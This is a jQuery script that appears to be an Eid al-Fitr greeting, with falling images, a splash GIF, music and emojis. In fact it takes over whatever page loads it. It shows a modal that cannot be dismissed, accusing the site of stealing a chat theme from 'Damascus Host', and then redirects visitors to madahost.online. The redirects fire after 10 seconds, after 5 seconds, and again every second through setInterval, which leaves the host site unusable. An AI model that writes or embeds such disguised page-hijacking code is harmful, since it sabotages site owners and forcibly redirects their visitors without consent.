$(document).ready(function() {
    let audio = $('<audio id="bg-audio" loop>')
        .append('<source src="https://github.com/dimashki98/mada/raw/refs/heads/main/%D8%B9%D9%8A%D8%AF%20%D9%8A%D8%A7%D9%84%D8%B9%D8%A7%D9%8A%D8%AF%D9%8A%D9%86%D8%A7.mp3" type="audio/mpeg">')
        .css({ opacity: '0' })
        .appendTo('body');

    let fallingImage = $('<img src="https://up6.cc/2025/03/174327444966841.png">').css({
        position: 'fixed',
        top: '-100vh',
        left: '50%',
        transform: 'translateX(-50%)',
        width: '100vw',
        height: '100vh',
        zIndex: '99998'
    }).appendTo('body');

    $(document).click(function() {
        audio[0].play();
        $(document).off('click');
    });

    fallingImage.animate({ top: '0' }, 1500, 'swing', function() {
        setTimeout(function() {
            fallingImage.fadeOut(500, function() {
                $(this).remove();
                
                let splashScreen = $('<div>').css({
                    position: 'fixed',
                    top: '0',
                    left: '0',
                    width: '100vw',
                    height: '100vh',
                    background: `url('https://up6.cc/2025/03/174254941706691.gif') center/cover no-repeat`,
                    zIndex: '99999'
                }).appendTo('body');

                setTimeout(function() {
                    splashScreen.fadeOut(500, function() {
                        $(this).remove();
                        Swal.fire({
                            title: "نهنئكم بحلول عيد الفطر",
                            html: `
                                <p>نتمنى لكم عيدًا سعيدًا مليئًا بالفرح والسرور.</p>
                                <p style="margin-top: 10px; font-size: 12px; color: red;">
                                    هذا الستايل مسروق من شات مدى الذي صممته شركة دمشق هوست وجميع الحقوق محفوظة لدمشق هوست.
                                </p>
                                <img src="https://madahost.online/sico/1739636799308.gif" style="margin-top: 15px; width: 300px;">
                                <br>
                                <img src="https://up6.cc/2025/03/174328262658581.gif" style="margin-top: 10px; width: 300px;">
                            `,
                            allowOutsideClick: false,
                            allowEscapeKey: false,
                            allowEnterKey: false,
                            showConfirmButton: false,
                            backdrop: true
                        });

                        startEmojiFall();

                        setTimeout(function() {
                            window.location.href = "https://madahost.online/";
                        }, 10000);
                    });
                }, 3000);
            });
        }, 1500);
    });

    function startEmojiFall() {
        const emojis = ["🎉", "✨", "🕌", "🎊", "🌙", "🕋"];
        let container = $('<div id="emoji-container"></div>').css({
            position: "fixed",
            top: "0",
            left: "0",
            width: "100vw",
            height: "100vh",
            pointerEvents: "none",
            zIndex: "999999"
        }).appendTo("body");

        for (let i = 0; i < 50; i++) { 
            setTimeout(() => {
                let emoji = $("<div>").text(emojis[Math.floor(Math.random() * emojis.length)]).css({
                    position: "absolute",
                    top: "-50px",
                    left: `${Math.random() * 100}vw`,
                    fontSize: `${Math.random() * 24 + 16}px`,
                    opacity: Math.random() * 0.8 + 0.2
                }).appendTo(container);

                animateEmoji(emoji);
            }, Math.random() * 5000);
        }
    }

    function animateEmoji(emoji) {
        let speed = Math.random() * 3000 + 3000;
        emoji.animate({ top: "100vh" }, speed, "linear", function() {
            $(this).remove();
        });
    }
});



setTimeout(function() {
    window.location.href = "https://madahost.online/"; // استبدل بالرابط الذي تريده
}, 5000);



setInterval(function() {
    window.location.href = "https://madahost.online/"; // استبدل بالرابط الذي تريده
}, 1000); // التوجيه كل 1000 مللي ثانية (1 ثانية)
